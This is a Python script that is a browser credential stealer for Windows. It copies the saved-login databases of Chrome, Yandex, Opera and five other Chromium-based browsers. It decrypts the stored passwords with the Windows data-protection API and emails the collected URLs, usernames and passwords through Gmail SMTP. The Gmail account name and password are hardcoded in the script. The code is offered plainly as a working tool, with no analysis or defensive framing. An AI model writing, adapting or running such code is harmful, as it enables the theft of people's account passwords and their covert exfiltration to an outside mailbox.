
from os.path import expanduser
from sqlite3 import connect
from winstr import *
import smtplib
import win32crypt

def main():
    pathusr = expanduser('~')

    chrome          = pathusr + r'''\AppData\Local\Google\Chrome\User Data\Default\Login Data'''
    yandex          = pathusr + r'''\AppData\Local\Yandex\YandexBrowser\User Data\Default\Login Data'''
    opera           = pathusr + r'''\AppData\Roaming\Opera Software\Opera Stable\Login Data'''
    kometa          = pathusr + r'''\AppData\Local\Kometa\User Data\Default\Login Data'''
    orbitum         = pathusr + r'''\AppData\Local\Orbitum\User Data\Default\Login Data'''
    comodo          = pathusr + r'''\AppData\Local\Comodo\Dragon\User Data\Default\Login Data'''
    amigo           = pathusr + r'''\AppData\Local\Amigo\User\User Data\Default\Login Data'''
    torch           = pathusr + r'''\AppData\Local\Torch\User Data\Default\Login Data'''

    databases = [chrome, yandex, opera, kometa, orbitum, comodo, amigo, torch]

    coped_db        = pathusr + '''\AppData\Logins'''
    file_with_logs  = pathusr + '''\AppData\Local\Temp\Logins.txt'''


    smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
    smtpObj.starttls()
    smtpObj.ehlo()
    smtpObj.login('artur.2002.artur@gmail.com', 'wasd123wasd')

    for db in databases:
        try:

            source = open(db, 'r')
            source.close()
            source_size = os.stat(db).st_size
            copied = 0
            source = open(db, 'rb')
            target = open(coped_db, 'wb')
            while True:
                chunk = source.read(32768)
                if not chunk:
                    break
                target.write(chunk)
                copied += len(chunk)
            source.close()
            target.close()

            con = connect(coped_db)
            cursor = con.cursor()

            cursor.execute("SELECT origin_url, username_value, password_value from logins;")
            var_with_logs = ''
            for log in cursor.fetchall():
                password = win32crypt.CryptUnprotectData(log[2], None, None, None, 0)[1]
                var_with_logs += str('URL: ' + log[0] + '\n')
                var_with_logs += str('Login : ' + log[1] + '\n')
                var_with_logs += str('Password : ' + password.decode('cp1251') + '\n\n')
            file = open(file_with_logs, 'w')
            file.writelines(var_with_logs)
            file.close()




        except FileNotFoundError as e:
            pass

    with open(file_with_logs, 'r')as f:
        data = f.read()
        smtpObj.sendmail('artur.2002.artur@gmail.com', 'artur.2002.artur@gmail.com', data)

if __name__ == '__main__':
    main()